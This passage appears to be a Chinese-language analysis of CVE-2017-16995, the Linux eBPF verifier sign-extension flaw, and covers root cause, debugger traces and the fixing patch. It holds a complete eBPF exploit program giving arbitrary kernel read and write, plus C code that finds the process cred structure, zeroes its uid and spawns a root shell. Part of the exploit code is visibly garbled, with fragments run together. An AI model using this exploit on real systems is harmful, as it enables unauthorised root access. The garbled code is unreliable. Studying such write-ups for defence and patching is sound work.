            /* Now overwrite non-defaults ... */
            /* 32 bit ALU operations */
            ...
## 漏洞分析
漏洞主要是do_check中使用的模拟寄存器类型和实际执行函数中的寄存器类型不同，导致一些判断可以绕过do_check，执行攻击者注入的任意eBPF指令。这里以下几条伪指令为例，第0条指令将立即数0xffffffff放到r9寄存器中，第1条指令检查r9是否0xffffffff，为真则向下继续执行，跳转到L2执行到L3退出。为在do_check函数中检查到exit为一条路径的结束，因为这条表达式的计算结果恒为真，因此不会把另一条路径压入栈。
然而在`__bpf_prog_run`函数中，我们使用64位类型变量存储立即数，这里的符号扩展导致比较的时候出现L1的比较失败，可以执行后面的指令。
    [0]: ALU_MOV_K(0,9,0x0,0xffffffff)
    [1]: JMP_JNE_K(0,9,0x2,0xffffffff)
    [2]: ALU64_MOV_K(0,0,0x0,0x0)
    [3]: JMP_EXIT(0,0,0x0,0x0)
    [4]: ......
这里我们直接去调试exp，定位到漏洞处的比较。在启动脚本中关掉kaslr，默认的内核加载地址是`0xffffffff81000000`，用`add-symbol-file ./vmlinux
0xffffffff81000000`，或者看一下`__bpf_prog_run`的地址直接下断点运行exp，可以看到虽然低4字节相同，但是因为`movsxd`的符号扩展，rdx被扩展为`0xffffffffffffffff`，从而比较失败，继续执行L4后面的指令。
    / # cat /proc/kallsyms | grep -F "__bpf_prog_run"
    ffffffff8116f190 t __bpf_prog_run
    / # ./poc
    [------------------------------------------------------------------------------]
    Legend: code, data, rodata, value
    ERROR: Could not find ELF base!
    ERROR: Could not find ELF base!
    0xffffffff8116fa83 in ?? ()
    LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    ──────────────────────────[ REGISTERS ]───────────────────────────
     RAX  0x2
     RBX  0xffffc9000008a030L ◂— 0xffffffff00020255
     RCX  0x0
     RDX  0xffffffffffffffff
     RDI  0xffffffff
     RSI  0xffffc9000008a028L ◂— 0xffffffff000002b4
     R8   0x0
     R9   0x0
     R10  0xffff88000d632000L ◂— add    byte ptr [rax], al
     R11  0xffff88000f7639c0L ◂— 0x0
     R12  0xffffffff81a32c20L —▸ 0xffffffff81170379L ◂— 0x4881a32c00c6c748
     R13  0x0
     R14  0xffff88000f7639c0L ◂— 0x0
     R15  0x40
     RBP  0xffff88000f733cb0L —▸ 0xffff88000f733cf8L —▸ 0xffff88000f733da0L —▸ 0xffff88000f733dc0L —▸ 0xffff88000f733e38L ◂— ...
     RSP  0xffff88000f733a30L —▸ 0xffff88000ec1a020L ◂— add    byte ptr [rax], al
     RIP  0xffffffff8116fa83L ◂— 0x88c59439480fe083
    ────────────────────────────[ DISASM ]────────────────────────────
       0xffffffff8116f7ad    mov    qword ptr [rbp + rax*8 - 0x278], rdi
       0xffffffff8116f7b5    movzx  eax, byte ptr [rbx]
       0xffffffff8116f7b8    jmp    qword ptr [r12 + rax*8]
        ↓
       0xffffffff8116fa7b    movzx  eax, byte ptr [rbx + 1]
       0xffffffff8116fa7f    movsxd rdx, dword ptr [rbx + 4]
     ► 0xffffffff8116fa83    and    eax, 0xf
       0xffffffff8116fa86    cmp    qword ptr [rbp + rax*8 - 0x278], rdx
       0xffffffff8116fa8e    je     0xffffffff8117053c
       0xffffffff8116fa94    movsx  rax, word ptr [rbx + 2]
       0xffffffff8116fa99    lea    rbx, qword ptr [rbx + rax*8 + 8]
       0xffffffff8116fa9e    movzx  eax, byte ptr [rbx]
    ────────────────────────────[ STACK ]─────────────────────────────
    00:0000│ rsp  0xffff88000f733a30L —▸ 0xffff88000ec1a020L ◂— add    byte ptr [rax], al
    01:0008│      0xffff88000f733a38L ◂— 0x0
    02:0010│      0xffff88000f733a40L —▸ 0xffff88000d632000L ◂— add    byte ptr [rax], al
    03:0018│      0xffff88000f733a48L ◂— 0xffffffff
    04:0020│      0xffff88000f733a50L —▸ 0xffff88000f733b20L —▸ 0xffff88000f733b38L —▸ 0xffff88000f733b88L —▸ 0xffff88000f733bc8L ◂— ...
    05:0028│      0xffff88000f733a58L —▸ 0xffffffff811e5d37L ◂— 0x102444c749
    06:0030│      0xffff88000f733a60L —▸ 0xffffffff811e4454L ◂— 0x1b808c48348
    07:0038│      0xffff88000f733a68L —▸ 0xffff88000ec1b1d0L ◂— add    byte ptr [rax], al
    ──────────────────────────[ BACKTRACE ]───────────────────────────
     ► f 0 ffffffff8116fa83
       f 1 ffff88000ec1a020
       f 2                0
    gdb-peda$ i r rdx
    rdx            0xffffffffffffffff       0xffffffffffffffff
    gdb-peda$ x/gx $rbx+4
    0xffffc9000008a034:     0x000000b7ffffffff
    gdb-peda$
## 漏洞利用
exp的核心是eBPF指令，可以自己编写解码函数来解码，也可以通过llvm-objdump等一些工具对指令解码，这里直接搬运X3h1n师姐的解码结果分析。其中0~3指令用来绕过check。
4指令获取map地址到r9寄存器，5指令填充(因为我们需要2个4字节寄存器存储8字节地址)。
`6-13`指令取出`map[0]`存储到r6寄存器中。同理`14-21`取出`map[1]`存储到r7寄存器，`22-29`取出`map[2]`存储到r8寄存器。
后面的指令可以分为三个部分，由r6即map[0]的值做区分：
  1. map[0]为0：r3=map[1],map[2]=r3，由于map1值可控，我们通过此指令组合实现任意地址泄露
  2. map[0]为1：将rbp存储到map[2]中，泄露内核栈基址
  3. map[0]为2：将map[2]的值写入到map[1]的地址上去，我们通过此指令组合实现任意地址写。
    [0]: ALU_MOV_K(BPF_REG_9, BPF_REG_0, 0x0, 0xffffffff)
    [1]: JMP_JNE_K(BPF_REG_9, BPF_REG_0, 0x2, 0xffffffff)
    [2]: ALU64_MOV_K(BPF_REG_0, BPF_REG_0, 0x0, 0x0)
    [3]: JMP_EXIT(BPF_REG_0, BPF_REG_0, 0x0, 0x0)
    [4]: LD_MAP_FD(BPF_REG_9, map_addr)
    [5]: bpf_map_padding
    [6]: ALU64_MOV_X(BPF_REG_1, BPF_REG_9, 0x0, 0x0)//r1=r9
    [7]: ALU64_MOV_X(BPF_REG_2, BPF_REG_10, 0x0, 0x0)//r2=r10(rbp)
    [8]: ALU64_ADD_K(BPF_REG_2, BPF_REG_0, 0x0, 0xfffffffc)//r2=r2-4
    [9]: ST_MEM_W(BPF_REG_10, BPF_REG_0, 0xfffc, 0x0)//[rbp-4]=r0
    [10]: BPF_RAW_INSN(BPF_JMP | BPF_CALL, BPF_REG_0, BPF_REG_0, 0, BPF_FUNC_map_lookup_elem)//执行BPF_FUNC_map_lookup_elem
    [11]: JMP_JNE_K(BPF_REG_0, BPF_REG_0, 0x1, 0x0)//r0 != 0
    [12]: JMP_EXIT(BPF_REG_0, BPF_REG_0, 0x0, 0x0)//exit
    [13]: LDX_MEM_DW(BPF_REG_6, BPF_REG_0, 0x0, 0x0)//r6=[r0]=map[0]
    [14]: ALU64_MOV_X(BPF_REG_1, BPF_REG_9, 0x0, 0x0)
    [15]: ALU64_MOV_X(BPF_REG_2, BPF_REG_10, 0x0, 0x0)
    [16]: ALU64_ADD_K(BPF_REG_2, BPF_REG_0, 0x0, 0xfffffffc)
    [17]: ST_MEM_W(BPF_REG_10, BPF_REG_0, 0xfffc, 0x1)
    [18]: BPF_RAW_INSN(BPF_JMP | BPF_CALL, BPF_REG_0, BPF_REG_0, 0, BPF_FUNC_map_lookup_elem)
    [19]: JMP_JNE_K(BPF_REG_0, BPF_REG_0, 0x1, 0x0)
    [20]: JMP_EXIT(BPF_REG_0, BPF_REG_0, 0x0, 0x0)
    [21]: LDX_MEM_DW(BPF_REG_7, BPF_REG_0, 0x0, 0x0)
    [22]: ALU64_MOV_X(BPF_REG_1, BPF_REG_9, 0x0, 0x0)
    [23]: ALU64_MOV_X(BPF_REG_2, BPF_REG_10, 0x0, 0x0)
    [24]: ALU64_ADD_K(BPF_REG_2, BPF_REG_0, 0x0, 0xfffffffc)
    [25]: ST_MEM_W(BPF_REG_10, BPF_REG_0, 0xfffc, 0x2)
    [26]: BPF_RAW_INSN(BPF_JMP | BPF_CALL, BPF_REG_0, BPF_REG_0, 0, BPF_FUNC_map_lookup_elem)
    [27]: JMP_JNE_K(BPF_REG_0, BPF_REG_0, 0x1, 0x0)
    [28]: JMP_EXIT(BPF_REG_0, BPF_REG_0, 0x0, 0x0)
    [29]: LDX_MEM_DW(BPF_REG_8, BPF_REG_0, 0x0, 0x0)
    [30]: ALU64_MOV_X(BPF_REG_2, BPF_REG_0, 0x0, 0x0)//r2=r0
    [31]: ALU64_MOV_K(BPF_REG_0, BPF_REG_0, 0x0, 0x0)//r0=0
    [32]: JMP_JNE_K(BPF_REG_6, BPF_REG_0, 0x3, 0x0)// if r6 != 0 jmp 36
    [33]: LDX_MEM_DW(BPF_REG_3, BPF_REG_7, 0x0, 0x0)//r3=[r7]
    [34]: STX_MEM_DW(BPF_REG_2, BPF_REG_3, 0x0, 0x0)//[r2]=r3
    [35]: JMP_EXIT(BPF_REG_0, BPF_REG_0, 0x0, 0x0)//exit
    [36]: JMP_JNE_K(BPF_REG_6, BPF_REG_0, 0x2, 0x1)//if r6 !=1 1 jmp 39
    [37]: STX_MEM_DW(BPF_REG_2, BPF_REG_10, 0x0, 0x0)//[r2]=r10=rbp
    [38]: JMP_EXIT(BPF_REG_0, BPF_REG_0, 0x0, 0x0)//exit
    [39]: STX_MEM_DW(BPF_REG_7, BPF_REG_8, 0x0, 0x0)//[r7]=r8
    [40]: JMP_EXIT(BPF_REG_0, BPF_REG_0, 0x0, 0x0)//exit
最终的漏洞利用步骤如下：
  1. 创建map，加载eBPF指令，绑定到socket
    mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), sizeof(long long), 3, 0);
        if (mapfd  %llx\n", skbuff);
        msg("Leaking sock struct from %llx\n", sock_addr);  
        if(sock_addr sk_rcvtimeo at offset %d\n", i * 8);
                            msg("Cred structure at %llx\n", cred_struct);
                msg("UID from cred structure: %d, matches the current: %d\n", test_uid, uid);
                return cred_struct;
            }
        }
  1. 使用任意地址写功能将cred的uid改为0，起root shell。
    static void
    hammer_cred(unsigned long addr) {
        msg("hammering cred structure at %llx\n", addr);
    #define w64(w) { write64(addr, (w)); addr += 8; }
        unsigned long val = read64(addr) & 0xFFFFFFFFUL;
        w64(val); 
        w64(0); w64(0); w64(0); w64(0);
        w64(0xFFFFFFFFFFFFFFFF); 
        w64(0xFFFFFFFFFFFFFFFF); 
        w64(0xFFFFFFFFFFFFFFFF); 
    #undef w64
    }
    //
    main(){
        //...
        if(execl("/bin/sh", "/bin/sh", NULL)) {
            fail("exec %s\n", strerror(errno));
        }
        //...
    }
## 漏洞patch
漏洞的patch如下[kernel/git/torvalds/linux.git](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=95a762e2c8c942780948091f8f2a4f32fce1ac6f)
这里在do_check里添加了对于`BPF_ALU64`指令的判断，从而将64和32的比较区分开来，使得预先check和实际run
code的检查环境一致，该漏洞无法再被利用。
    diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c
    index 625e358ca765..c086010ae51e 100644
    --- a/kernel/bpf/verifier.c
    +++ b/kernel/bpf/verifier.c
    @@ -2408,7 +2408,13 @@ static int check_alu_op(struct bpf_verifier_env *env, struct bpf_insn *insn)
                 * remember the value we stored into this reg
                 */
                regs[insn->dst_reg].type = SCALAR_VALUE;
    -           __mark_reg_known(regs + insn->dst_reg, insn->imm);
    +           if (BPF_CLASS(insn->code) == BPF_ALU64) {
    +               __mark_reg_known(regs + insn->dst_reg,
    +                        insn->imm);
    +           } else {
    +               __mark_reg_known(regs + insn->dst_reg,
    +                        (u32)insn->imm);
    +           }
            }
        } else if (opcode > BPF_END) {
## 参考资料
[eBPF 简史-张亦鸣](https://www.ibm.com/developerworks/cn/linux/l-lo-eBPF-history/index.html)
[Linux
ebpf模块整数扩展问题导致提权漏洞分析（CVE-2017-16995）](http://p4nda.top/2019/01/18/CVE-2017-16995/)
[CVE-2017-16995复现](https://x3h1n.github.io/2020/03/07/CVE-2017-16995%E5%A4%8D%E7%8E%B0/)
[cve-2017-16995
漏洞复现](https://v1ckydxp.github.io/2019/09/02/2019-09-02-cve-2017-16995%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/)
[filter的官方文档](https://www.kernel.org/doc/Documentation/networking/filter.txt)